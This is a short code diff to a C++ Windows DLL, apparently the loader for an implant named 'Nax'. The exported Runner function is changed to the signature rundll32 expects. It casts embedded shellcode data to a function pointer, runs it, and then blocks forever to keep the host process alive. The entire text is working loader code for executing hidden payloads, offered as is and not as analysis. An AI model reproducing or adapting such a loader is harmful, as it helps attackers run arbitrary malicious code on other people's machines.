@@ -1,9 +1,10 @@
 #include <Nax.h>
 #include <Shellcode.h>
 
-EXTERN_C auto DLLEXPORT Runner( VOID ) -> VOID {
+EXTERN_C auto DLLEXPORT Runner( HWND hwnd, HINSTANCE hinst, LPSTR cmdLine, int nCmdShow ) -> VOID {
     VOID ( *Nax )( VOID ) = ( decltype( Nax ) )Shellcode::Data;
     Nax();
+    WaitForSingleObject( (HANDLE)-1, INFINITE );
 }
 
 auto WINAPI DllMain(
@@ -11,20 +12,8 @@ auto WINAPI DllMain(
     ULONG     Reason,
     PVOID     Reserved
 ) -> BOOL {
-    switch( Reason ) {
-        case DLL_PROCESS_ATTACH:
-            break;
-        case DLL_THREAD_ATTACH:
-            break;
-        case DLL_THREAD_DETACH:
-            break;
-        case DLL_PROCESS_DETACH:
-            if (Reserved != nullptr)
-            {
-                break;
-            }
-            break;
-    }
+    if ( Reason == DLL_PROCESS_ATTACH )
+        DisableThreadLibraryCalls( DllInstance );
     return TRUE;
 }
 
